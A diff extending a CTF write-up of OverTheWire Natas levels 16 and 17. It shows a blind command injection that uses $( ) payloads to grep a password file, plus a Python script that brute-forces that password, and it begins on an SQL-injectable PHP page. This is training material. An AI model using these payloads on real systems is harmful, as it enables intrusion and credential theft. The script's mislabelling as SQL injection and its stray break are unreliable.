@@ -1,4 +1,4 @@
-I will be solving the Natas Labs from OverTheWire. OverTheWire is a platform that can help you learn and practice security concepts in the form of fun-filled games.
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9bcfe749-a0aa-4634-8848-c93f2f41a748)I will be solving the Natas Labs from OverTheWire. OverTheWire is a platform that can help you learn and practice security concepts in the form of fun-filled games.
 
 PS: As I keep solving the labs, I'll be adding them to this writeup
 
@@ -1070,13 +1070,145 @@ username:```natas16```        password```TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a1e9d3c8-b88c-41e6-a827-57d8bfd56734)
 
+Viewing the source code we get this php code
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+This code is similar to the one in in level 10, it's just that this code is more secured. It filters out more special characters. One thing I noticed is that it didn't filter out the character ```$```,```)``` and ```(```.
+
+Trying this command ```$(sleep 10)``` made me realize I was dealing with a blind command injection. When you run that command, you'll notice that it'll take the webpage exactly 10 seconds to return an output
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f1b91045-f913-4425-b744-b1169e779f47)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/13ee7026-224b-45c7-b899-49c6e925c524)
+
+We can go ahead to inject code
+
+command:```$(echo person)```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b272aa0e-18ed-4c49-be05-378d29c41503)
+
+If you recall when we solved level 10 we had to check if the character exists in the file, well this is similar
+
+So, does ```/etc/natas_webpass/natas17``` contains the letter ```a```??
+
+To test this we can try the conmand ```person$(grep a /etc/natas_webpass/natas17)``` if the letter is  present in the file the output will be empty, if the letter isn't present the output will be ```person```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5f474b1f-2057-4952-9e84-957700ec4ccb)
+
+As, you can see there's an output 
+
+Lets try for the letter ```b```
+
+command:```person$(grep b /etc/natas_webpass/natas17)```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b26e09a9-8881-4a38-bbfa-dddcfeae79ea)
+
+As you can see, there's no output. This means the letter ```b``` is present in the ```/etc/natas_webpass/natas17``` file.
+
+We'll be using a python script to get the full password to the next level
+
+```python
+#!/bin/python
+import requests,string
+
+url = "http://natas16.natas.labs.overthewire.org"
+auth_username = "natas16"
+auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+
+characters = ''.join([string.ascii_letters,string.digits])
+
+password = []
+for i in range(1,34):
+    for char in characters:
+        uri = "{0}?needle=$(grep -E ^{1}{2}.* /etc/natas_webpass/natas17)hackers".format(url,''.join(password),char)
+        r = requests.get(uri, auth=(auth_username,auth_password))
+        if 'hackers' not in r.text:
+            password.append(char)
+            print(''.join(password))
+            break
+        else: continue
+
+   break
+```
+<font color="green">The Python code performs a blind-based SQL injection attack to extract the password character by character from a target web application. It iterates through a character set and constructs URLs with injection payloads. By analyzing the response, it determines whether each character is part of the password and appends it to the password list. The code continues this process until the complete password is retrieved</font>
+
+Save the  script in a file and run it
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/71f39d86-431a-410f-9d71-75de91b9b35c)
+
+Cool, we got the password to the next level
 
 
 
+# Level 17
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/86ee49fb-b95f-4246-b030-c7ff399769ea)
 
+Navigating to the webpage and using the password we got from the previous level
 
+username:```natas17```         password:```XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd```
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8b924eee-914b-4664-a2ef-0d825cb25f43)
+
+Viewing the source code;
+
+```php
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas17', '<censored>');
+    mysqli_select_db($link, 'natas17');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+} else {
+?>
+```
+Explaining the code
+```
+1. It connects to a MySQL database and selects the "natas17" database.
+2. The code constructs a SQL query to retrieve records from the "users" table based on the provided username.
+3. If the query execution is successful, it checks if any rows are returned.
+4. The code does not provide specific output for the existing or non-existing user cases.
+5. Any query execution errors are not handled or displayed.
+```
 
 
 
